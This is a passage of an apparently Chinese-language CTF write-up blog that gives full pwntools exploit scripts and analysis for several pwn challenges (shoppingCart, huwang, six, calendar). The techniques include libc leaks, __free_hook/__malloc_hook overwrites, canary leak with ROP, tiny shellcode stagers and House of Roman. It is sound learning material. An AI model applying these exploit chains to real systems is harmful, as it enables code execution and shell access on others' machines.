class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib==<span class="number">0</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf0274</span>,<span class="number">0xf1117</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x260</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./task_shoppingCart'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./task_shoppingCart'</span>)<span class="comment">#,env=&#123;'LD_PRELOAD' :libc_name&#125;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote( <span class="string">'117.78.26.133'</span>, <span class="number">31666</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"What is your goods name?"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods that you don't need?"</span>)</span><br><span class="line">p.sendline(str(idx) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods you need to modify?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_vul</span><span class="params">(context)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods you need to modify?"</span>)</span><br><span class="line">p.send(context)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x13</span>):</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>)</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\0'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'OK, what would you like to modify '</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc.address = libc_addr- <span class="number">0x10</span> - <span class="number">344</span> -libc.symbols[<span class="string">'__malloc_hook'</span>] </span><br><span class="line">p.send(<span class="string">'p4nda'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak'</span>,hex(libc_addr) </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system'</span>,hex(libc.symbols[<span class="string">'system'</span>]) </span><br><span class="line"></span><br><span class="line">edit( (<span class="number">0x202140</span>+<span class="number">19</span>*<span class="number">8</span> - <span class="number">0x2021E0</span> )/<span class="number">8</span> &amp;<span class="number">0xffffffffffffffff</span> )</span><br><span class="line">p.recvuntil(<span class="string">'to?'</span>)</span><br><span class="line">p.send(<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">raw_input()</span><br><span class="line">payload = (str((<span class="number">0x202140</span> - <span class="number">0x2021E0</span> )/<span class="number">8</span> &amp;<span class="number">0xffffffffffffffff</span>)+<span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">payload+= (str(<span class="number">2</span>)+<span class="string">'\n'</span>) </span><br><span class="line">payload+= (str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span><span class="number">-0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+= p64(libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+= p64(libc.symbols[<span class="string">'__free_hook'</span>]) * <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit_vul(payload)</span><br><span class="line">p.recvuntil(<span class="string">'to?'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h2><p>此题不是我做出的，贴一个w1tcher的EXP吧</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sixsixsix</span><span class="params">(p, name, rd, secret, flag = <span class="number">1</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'666'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'secret?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'secret:\n'</span>)</span><br><span class="line">    p.sendline(str(rd))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">        p.send(secret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GameStart</span><span class="params">(ip, port, debug)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./huwang'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">    sixsixsix(p, <span class="string">'w1tcher'</span>, <span class="number">-1</span>, <span class="string">'w1tcher'</span>, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'timeout~'</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./huwang'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x040110D\nc'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    sixsixsix(p, <span class="string">'w1tcher'</span>.ljust(<span class="number">0x19</span>, <span class="string">'a'</span>), <span class="number">1</span>, <span class="string">'4ae71336e44bf9bf79d2752e234818a5'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'w1tcher'</span>.ljust(<span class="number">0x19</span>, <span class="string">'a'</span>))</span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + p.recvn(<span class="number">7</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'occupation?\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xff</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    shellcode = <span class="string">'a'</span> * <span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode += p64(<span class="number">0x0000000000401573</span>) + p64(<span class="number">0x0602F70</span>) + p64(<span class="number">0x40101C</span>)</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    p.recvuntil(<span class="string">'Congratulations, '</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">6</span>) + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    p.recvuntil(<span class="string">'occupation?\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xff</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    shellcode = <span class="string">'a'</span> * <span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode += p64(<span class="number">0x0000000000401573</span>) + p64(next(libc.search(<span class="string">'/bin/sh'</span>)) + libc_addr) + p64(libc_addr + libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    p.send(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">'117.78.26.79'</span>, <span class="number">31399</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="six"><a href="#six" class="headerlink" title="six"></a>six</h2><p>此题恰好之前在看雪论坛上见到过类似的，并且还讨论并且复现了一下，所以就直接用之前的EXP打了，拿了2血。手速还是慢了，不知道是不是和我讨论的师傅拿了一血。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目就是一个6字节的shellcode。</p><p>其中，程序申请了两块0x1000的内存，分别用作栈和代码段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">6u</span>LL);</span><br><span class="line">read(fd, &amp;v3, <span class="number">6u</span>LL);</span><br><span class="line">dest = mmap((<span class="keyword">void</span> *)(v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">qword_202098 = (__int64)mmap((<span class="keyword">void</span> *)(buf &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) + <span class="number">1280</span>;</span><br></pre></td></tr></table></figure><p>可以看到生成的方法是用/dev/urandom的随机数，第一次在看雪上看到这个生成方法时觉得二者是不可能连在一起的，但是当这两个地址冲突或者不符合条件时，mmap会随机分配这个地址，而当二者均随机分配时，则这两个地址是相连的。这个前提解决了很多问题，节省了很多指令。</p><p>而在执行shellcode时，预先将除rsp、rip其他寄存器全部置零了，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7f90763a4000:mov    rsp,rdi</span><br><span class="line">   0x7f90763a4003:xor    rbp,rbp</span><br><span class="line">   0x7f90763a4006:xor    rax,rax</span><br><span class="line">   0x7f90763a4009:xor    rbx,rbx</span><br><span class="line">   0x7f90763a400c:xor    rcx,rcx</span><br><span class="line">   0x7f90763a400f:xor    rdx,rdx</span><br><span class="line">   0x7f90763a4012:xor    rdi,rdi</span><br><span class="line">   0x7f90763a4015:xor    rsi,rsi</span><br><span class="line">   0x7f90763a4018:xor    r8,r8</span><br><span class="line">   0x7f90763a401b:xor    r9,r9</span><br><span class="line">   0x7f90763a401e:xor    r10,r10</span><br><span class="line">   0x7f90763a4021:xor    r11,r11</span><br><span class="line">   0x7f90763a4024:xor    r12,r12</span><br><span class="line">   0x7f90763a4027:xor    r13,r13</span><br><span class="line">   0x7f90763a402a:xor    r14,r14</span><br><span class="line">   0x7f90763a402d:xor    r15,r15</span><br></pre></td></tr></table></figure><p>但当两块内存相连时，如果从rsp进行覆写的话，是可以覆写到代码段的。</p><p>因此shellcode如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f90763a4030    push   rsp</span><br><span class="line">0x7f90763a4031    pop    rsi</span><br><span class="line">0x7f90763a4032    mov    edx, esi</span><br><span class="line">0x7f90763a4034    syscall</span><br></pre></td></tr></table></figure><p>如此，便可以从栈上向代码段一直写入，直到写入现在的RIP，将后续指令写为shellcraftsh()</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">'./six'</span>)</span><br><span class="line"><span class="comment">#p=remote('117.78.26.97', 32200)#process('./seven')</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.readuntil(<span class="string">'shellcode:'</span>)</span><br><span class="line">payload=chr(<span class="number">0x54</span>)+chr(<span class="number">0x5e</span>)+chr(<span class="number">0x8b</span>)+chr(<span class="number">0xd6</span>)+chr(<span class="number">0x0F</span>)+chr(<span class="number">0x05</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">z=[</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xFE</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x4e</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>,<span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x33</span>, <span class="number">0xF6</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>]</span><br><span class="line">zz=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(z)):</span><br><span class="line">    zz+=chr(z[i])</span><br><span class="line">payload=<span class="string">'b'</span>*<span class="number">0xb36</span>+zz</span><br><span class="line">p.writeline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h2><p>此题无论从题目给定的条件和hint都说明是House of Roman。</p><p>这个利用方法半年以前被提出，主要思路是解决无法泄露地址时，通过低位地址写+爆破的方法来对抗aslr。可以参考<a href="https://xz.aliyun.com/t/2316" target="_blank" rel="noopener">https://xz.aliyun.com/t/2316</a></p><h3 id="题目及漏洞分析-1"><a href="#题目及漏洞分析-1" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h3><p>题目功能很简单了，提供了add、edit、free三个功能，并且不限制次数，但只提供4个指针位置了。</p><p>其中，程序的读取输入函数存在off_by_one漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">read_n_off_by_one</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而free函数没有置空指针，导致存在UAF漏洞。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>知道了漏洞条件后就利用了，对比最初的House of Roman，题目增加了对内存块大小的限制，大小限制在fastbin中，但是并通过off-by-one + free可以构造unsorted bin。</p><p>可以看一下原始的House of Roman是如何利用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 首先分配 3 个 chunk （A , B, C） ，大小分别为 0x20, 0xd0, 0x70</span><br><span class="line">2. 在 B + 0x78 处设置 p64(0x61) ， 作用是 fake size ,用于后面 的 fastbin attack</span><br><span class="line">释放掉 B , B 进入 unsorted bin , 此时 B+0x10 和 B+0x18 中有 main_arean 的地址</span><br><span class="line">再次分配 0xd0 , 会分配到 B， 此时 B+0x10 和 B+0x18 中 main_arean 的地址依然存在</span><br><span class="line">然后分配 3 个 0x70 的 chunk (D , E, F)， 为后续做准备</span><br><span class="line">3. 在 A 触发 单字节溢出，修改 B-&gt;size = 0x71 . 然后释放 C , D， 此时 C , D 进入 fastbin , 同时 D-&gt;fd = C. 由于 chunk之间的相对偏移固定，于是利用 uaf 修改 D-&gt;fd 的低 字节 ，使得 D-&gt;fd=B</span><br><span class="line">4. 此时 B-&gt;size = 0x71 ，同时 B + 0x78 为 p64(0x61) （第2步设置）， 这就成功伪造了一个 0x70 大小的 fastbin。 此时 B-&gt;fd 为 main_arean 的地址，于是通过 修改 低 2个字节，可以修改到 malloc_hook - 0x23 处 （ malloc_hook - 0x23 + 0x8 处的值为 p64(0x7f) )</span><br><span class="line">5. 然后分配 3 次 0x70 的 chunk， 就可以拿到包含 malloc_hook 的 chunk, 此时 malloc_hook 内容为 0</span><br><span class="line">6. 然后利用 unsorted bin 修改 malloc_hook 内容为 main_arean 的地址</span><br><span class="line">7. 利用部分写修改 malloc_hook 为 one_gadget</span><br><span class="line">8. 多次释放一个指针，触发 double free 异常，进而触发 malloc_printerr ， getshell</span><br></pre></td></tr></table></figure><p>总结一下就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 通过unsorted bin的分配与释放，再次分配时可以得到main_arena+88这个地址，通过写低字节可以写为__malloc_hook-0x23。</span><br><span class="line">2. 释放当初申请的堆块，通过修改堆块第地址的方法，让修改为__malloc_hook-0x23的堆块进入0x70的fastbin链。因而可以通过malloc得到__malloc_hook-0x23这个堆块</span><br><span class="line">3. 通过unsorted bin attack让__malloc_hook处置为main_arena+88，再通过写低字节，将其写为one_gadget，从而拿到shell。</span><br></pre></td></tr></table></figure><p>可以看到最初的aslr随机为是32比特，爆破概率为1/4294967296，而用此方法可将爆破概率提高为1/2**12 = 1/4096。（由one_gadget与main_arena+88偏移决定）</p><p>此题由于没有unsorted bin，所以可以用一字节溢出，再释放的方法得到unsorted bin，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>当得到这个unsorted bin之后，再将其分配出来。</p><p>0 ,3 分别是unsorted bin的两部分，2是用于防止合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># first chunk of unsorted bin </span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># second chunk of unsorted bin</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><p>通过对0的低地址写，可以将其fd写为__malloc_hook-0x23。</p><p>然后释放3、2两个块，此时fastbin上存在两个块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>] ) </span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>当对2块低地址写，可以将2块的fd指向0块，此时0块进入fastbin，其fd是__malloc_hook-0x23。并且可将__malloc_hook-0x23申请回来，存在3的位置上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)  <span class="comment"># malloc_hook -0x23 is here</span></span><br><span class="line"><span class="comment">#repair fastbin</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">7</span>,p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>接下来就可以构造unsorted bin attack了。</p><p>首先还是同样的方法得到unsorted bin，由于unsorted bin attack 需要满足一些size的检测，因此提前构造堆结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x67</span>,(p64(<span class="number">0x70</span>)+p64(<span class="number">0x20</span>))*<span class="number">4</span>+(p64(<span 